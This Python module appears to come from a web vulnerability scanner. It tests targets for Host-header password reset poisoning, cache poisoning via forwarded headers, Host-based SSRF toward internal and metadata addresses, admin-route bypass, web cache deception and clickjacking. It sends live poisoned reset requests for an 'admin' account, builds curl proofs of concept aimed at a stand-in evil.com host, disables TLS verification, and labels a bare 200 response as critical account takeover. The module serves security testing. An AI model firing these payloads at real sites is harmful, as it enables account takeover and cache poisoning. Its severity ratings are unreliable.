"""
BugScan ELITE — Host Header Injection Engine
Tests for:
- Password reset poisoning via Host header manipulation
- Cache poisoning via unkeyed headers
- SSRF via Host header
- Routing-based auth bypass
- Web cache deception
"""
import re, time, logging, urllib.parse, urllib.request, ssl
from typing import List, Dict, Optional

log = logging.getLogger("elite.hostheader")

ATTACKER = "bugscanelit3.evil.com"

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=10):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"*/*"}
        if headers: h.update(headers)
        body = data.encode() if isinstance(data,str) else data
        req  = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(32768).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(4096).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except: return None

def _F(url, name, sev, details):
    return {
        "type":"host_header","bug":"misconfig","severity":sev,
        "url":url,"name":name,"details":details,
        "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ"),
    }


def check_host_header_injection(targets: List[str], endpoints: List[str]) -> List[Dict]:
    findings = []

    for target in targets[:50]:
        base = target.rstrip("/")
        parsed = urllib.parse.urlparse(base)
        real_host = parsed.netloc

        # ── 1. Basic Host header reflected in response ────────────────────
        r = _req(base, headers={"Host": ATTACKER})
        if r:
            status, hdrs, body = r
            if ATTACKER in body:
                findings.append(_F(base,
                    "Host Header Reflected in Response", "high", {
                    "description": f"The Host header value '{ATTACKER}' is reflected in the response body. This can enable password reset poisoning if a reset link is generated using the Host header.",
                    "poc": f"curl -H 'Host: {ATTACKER}' '{base}'",
                    "impact": "Password reset link poisoning — attacker intercepts reset tokens by setting malicious Host header.",
                    "remediation": "Generate absolute URLs using server-configured hostname, never from Host header.",
                }))

        # ── 2. Password reset endpoint — Host header poisoning ────────────
        reset_paths = ["/forgot-password","/password/reset","/account/recover",
                       "/auth/reset","/user/forgot","/api/password/reset",
                       "/reset-password","/forgot","/recover","/password-reset"]
        for path in reset_paths:
            url = base + path
            # GET first to check it exists
            r = _req(url)
            if not r or r[0] not in (200, 302, 405): continue

            # POST with poisoned Host + dummy email
            poison_headers = {
                "Host":         ATTACKER,
                "Content-Type": "application/x-www-form-urlencoded",
            }
            data = "email=victim@example.com&username=admin"
            r2   = _req(url, "POST", headers=poison_headers, data=data)
            if r2 and r2[0] in (200, 302):
                findings.append(_F(url,
                    "Password Reset Poisoning via Host Header", "critical", {
                    "description": (
                        f"The password reset endpoint at {url} accepts requests with "
                        f"a manipulated Host header. If the reset email link is built "
                        f"from the Host header, the token is sent to the attacker's domain."
                    ),
                    "poc": (
                        f"curl -X POST '{url}' \\\n"
                        f"  -H 'Host: {ATTACKER}' \\\n"
                        f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                        f"  -d 'email=victim@example.com'\n\n"
                        f"# Victim receives: https://{ATTACKER}/reset?token=SECRET"
                    ),
                    "impact": "Full account takeover — intercept password reset tokens for any account.",
                    "remediation": "Whitelist allowed hostnames server-side. Never use Host header to build reset URLs.",
                }))
            break

        # ── 3. X-Forwarded-Host cache poisoning ──────────────────────────
        poison_hdrs = [
            "X-Forwarded-Host",
            "X-Host",
            "X-Forwarded-Server",
            "X-HTTP-Host-Override",
            "Forwarded",
        ]
        for hdr in poison_hdrs:
            r = _req(base, headers={hdr: ATTACKER})
            if r and ATTACKER in r[2]:
                findings.append(_F(base,
                    f"Cache Poisoning via {hdr}", "high", {
                    "description": f"The header '{hdr}: {ATTACKER}' is reflected in the response. If cached, this poisons the cache with malicious content for all users.",
                    "poc": f"curl -H '{hdr}: {ATTACKER}' '{base}'",
                    "impact": "Web cache poisoning — serve malicious content to all users from the cache.",
                    "remediation": f"Do not use {hdr} to build URLs or include in responses. Strip untrusted headers at the load balancer.",
                }))
                break

        # ── 4. SSRF via Host header ───────────────────────────────────────
        internal_hosts = [
            "localhost", "127.0.0.1", "169.254.169.254",
            "0.0.0.0", "::1", "internal",
        ]
        for internal in internal_hosts:
            r = _req(base, headers={"Host": internal})
            if r:
                status, hdrs, body = r
                if internal in body or any(s in body for s in
                    ["ami-id","instance-id","root:","localhost"]):
                    findings.append(_F(base,
                        "SSRF via Host Header", "critical", {
                        "description": f"Setting Host: {internal} causes the server to route to internal services.",
                        "poc": f"curl -H 'Host: {internal}' '{base}'",
                        "impact": "Internal service access via Host header SSRF.",
                        "remediation": "Validate and whitelist the Host header against known hostnames.",
                    }))
                    break

        # ── 5. Routing bypass via Host header ────────────────────────────
        bypass_hosts = [
            f"admin.{real_host}",
            f"internal.{real_host}",
            "localhost",
            "127.0.0.1",
        ]
        for bhost in bypass_hosts:
            r1 = _req(base + "/admin",  headers={"Host": real_host})
            r2 = _req(base + "/admin",  headers={"Host": bhost})
            if r1 and r2:
                if r2[0] in (200,) and r1[0] in (401,403,404):
                    findings.append(_F(base + "/admin",
                        "Admin Access via Host Header Bypass", "critical", {
                        "description": f"Setting Host: {bhost} bypasses access controls on /admin (got {r2[0]} instead of {r1[0]}).",
                        "poc": f"curl -H 'Host: {bhost}' '{base}/admin'",
                        "impact": "Unauthorized admin panel access.",
                        "remediation": "Whitelist allowed Host values. Enforce auth based on session, not Host header.",
                    }))
                    break

        # ── 6. Open Redirect via Host header ─────────────────────────────
        redirect_paths = ["/redirect","/go","/out","/r","/link","/forward"]
        for path in redirect_paths:
            r = _req(base + path, headers={"Host": ATTACKER})
            if r:
                loc = r[1].get("Location","")
                if ATTACKER in loc:
                    findings.append(_F(base + path,
                        "Open Redirect via Host Header", "medium", {
                        "description": f"Host header value reflected in Location redirect header.",
                        "poc": f"curl -I -H 'Host: {ATTACKER}' '{base}{path}'",
                        "impact": "Phishing via trusted redirect.",
                        "remediation": "Build redirect URLs from server config, not request headers.",
                    }))

    return findings


def check_web_cache_deception(targets: List[str]) -> List[Dict]:
    """
    Web Cache Deception: trick cache into storing authenticated response
    by appending a static-looking suffix to a dynamic authenticated URL.
    """
    findings = []
    SUFFIXES = [
        "/nonexistent.css", "/style.css", "/main.js", "/logo.png",
        "/../nonexistent.css", "%2F..%2Fnonexistent.css",
    ]
    PRIVATE_PATHS = [
        "/profile", "/account", "/dashboard", "/settings",
        "/api/user", "/api/me", "/api/profile",
    ]

    for target in targets[:20]:
        base = target.rstrip("/")
        for path in PRIVATE_PATHS:
            # Check baseline - does the page require auth?
            r_auth = _req(base + path)
            if not r_auth or r_auth[0] in (401,403,302): continue
            if r_auth[0] != 200: continue

            baseline_body = r_auth[2]
            # Check for account-specific content
            has_private = any(kw in baseline_body.lower() for kw in
                              ["email","account","username","profile","logout","sign out"])
            if not has_private: continue

            # Try cache deception suffixes
            for suffix in SUFFIXES:
                deceive_url = base + path + suffix
                r_decept = _req(deceive_url)
                if not r_decept or r_decept[0] != 200: continue

                # Check if same private content returned
                if any(kw in r_decept[2].lower() for kw in
                       ["email","account","username","profile"]):
                    findings.append(_F(base + path,
                        "Web Cache Deception", "high", {
                        "description": (
                            f"The authenticated page {path} is served when accessed with "
                            f"static-looking suffix '{suffix}'. If cached, an attacker can "
                            f"trick a victim into visiting the URL to steal their session content."
                        ),
                        "poc": (
                            f"# Step 1: Share this URL with victim\n"
                            f"{deceive_url}\n\n"
                            f"# Step 2: Fetch cached response\n"
                            f"curl '{deceive_url}'"
                        ),
                        "impact": "Cache stores authenticated user data, accessible by unauthenticated attacker.",
                        "remediation": "Set Cache-Control: no-store on all authenticated responses. Validate path extensions.",
                    }))
                    break

    return findings


def check_clickjacking(endpoints: list, targets: list = None) -> list:
    """Check for missing X-Frame-Options (clickjacking)."""
    from engine.scanner_utils import _get
    findings = []
    for ep in (endpoints or [])[:20]:
        try:
            r = _get(ep, 8)
            if r and r[0] < 400:
                hdrs = str(r[1])
                if 'x-frame-options' not in hdrs.lower() and 'content-security-policy' not in hdrs.lower():
                    findings.append({"bug":"misconfig","severity":"medium","url":ep,
                        "title":"Missing X-Frame-Options (Clickjacking)","confidence":70})
        except: pass
    return findings
